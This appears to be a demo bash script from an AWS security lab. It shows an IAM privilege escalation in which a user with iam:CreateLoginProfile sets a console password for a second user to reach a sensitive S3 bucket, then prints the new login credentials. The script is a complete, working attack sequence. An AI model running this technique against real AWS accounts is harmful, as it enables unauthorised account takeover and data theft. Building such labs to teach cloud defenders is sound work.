#!/bin/bash

# Demo script for iam:CreateLoginProfile privilege escalation to S3 bucket access
# This script demonstrates how a user with CreateLoginProfile permission can escalate to S3 bucket access

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-clp-bucket-starting-user"
HOP1_USER="pl-prod-clp-bucket-hop1"

# Generate a random password suffix (8 characters)
RANDOM_SUFFIX=$(openssl rand -hex 4)
PASSWORD="PathfindingLabs123!${RANDOM_SUFFIX}"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreateLoginProfile to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Extract credentials from Terraform outputs
echo -e "${YELLOW}Step 1: Extracting credentials from Terraform outputs${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_iam_createloginprofile.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
SECRET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$ACCESS_KEY" == "null" ] || [ -z "$ACCESS_KEY" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Retrieved credentials${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Export credentials as environment variables
export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
unset AWS_SESSION_TOKEN  # Clear any session token

echo -e "${GREEN}✓ Successfully extracted and configured credentials${NC}\n"

# Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Current identity: $CURRENT_USER"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Discover target bucket
echo -e "${YELLOW}Step 4: Discovering target bucket${NC}"
# Try to get bucket name from Terraform output first
pushd $TERRAFORM_DIR > /dev/null
TARGET_BUCKET=$(terraform output -raw prod_one_hop_to_bucket_iam_createloginprofile_sensitive_bucket_name 2>/dev/null || echo "")
popd > /dev/null

# If Terraform output not available, try to discover via naming pattern
if [ -z "$TARGET_BUCKET" ] || [ "$TARGET_BUCKET" == "null" ]; then
    echo "Terraform output not available, using expected naming pattern..."
    # Look for buckets matching our naming pattern
    TARGET_BUCKET=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-clp-')].Name | [0]" --output text 2>/dev/null || echo "")

    if [ -z "$TARGET_BUCKET" ] || [ "$TARGET_BUCKET" == "None" ]; then
        echo -e "${YELLOW}Warning: Could not discover target bucket${NC}"
        TARGET_BUCKET="pl-sensitive-data-clp-${ACCOUNT_ID}"  # Fallback pattern
    fi
fi

echo "Target bucket: $TARGET_BUCKET"
echo -e "${GREEN}✓ Identified target bucket${NC}\n"

# Step 5: Check if hop1 user already has a login profile
echo -e "${YELLOW}Step 5: Checking if hop1 user has a login profile${NC}"
echo "Checking for existing login profile for user: $HOP1_USER"

if aws iam get-login-profile --user-name $HOP1_USER &> /dev/null; then
    echo -e "${RED}⚠ Login profile already exists for $HOP1_USER${NC}"
    echo "Please run ./cleanup_attack.sh first to remove the existing login profile"
    exit 1
else
    echo -e "${GREEN}✓ Confirmed: No login profile exists (ready for attack)${NC}"
fi
echo ""

# Step 6: Verify we don't have S3 bucket access yet
echo -e "${YELLOW}Step 6: Verifying we don't have S3 bucket access yet${NC}"
echo "Target bucket: $TARGET_BUCKET"
echo "Attempting to list bucket contents (should fail)..."

if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket (as expected)${NC}"
fi
echo ""

# Step 7: Create login profile for hop1 user
echo -e "${YELLOW}Step 7: Creating login profile for hop1 user${NC}"
echo "Creating console password for user: $HOP1_USER"
echo "Password: $PASSWORD"

aws iam create-login-profile \
    --user-name $HOP1_USER \
    --password "$PASSWORD" \
    --no-password-reset-required

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created login profile!${NC}"
else
    echo -e "${RED}Failed to create login profile${NC}"
    exit 1
fi
echo ""

# Wait for IAM propagation
echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
sleep 15
echo ""

# Step 8: Verify we now have the login profile
echo -e "${YELLOW}Step 8: Login profile has been successfully created${NC}"
echo "The hop1 user can now log in with the new password."
echo -e "${GREEN}✓ Confirmed login profile creation!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Used ${YELLOW}iam:CreateLoginProfile${NC} to create console password for $HOP1_USER"
echo -e "Step 2: Gained ${YELLOW}S3 Bucket Access${NC} (console login)"
echo -e "Result: ${GREEN}S3 Bucket Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (CreateLoginProfile) → $HOP1_USER → Console Login → S3 Bucket ($TARGET_BUCKET)"
echo ""
echo -e "${GREEN}Console Login Information:${NC}"
CONSOLE_URL="https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
echo -e "  URL: ${YELLOW}$CONSOLE_URL${NC}"
echo -e "  Username: ${YELLOW}$HOP1_USER${NC}"
echo -e "  Password: ${YELLOW}$PASSWORD${NC}"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the login profile${NC}"
echo ""
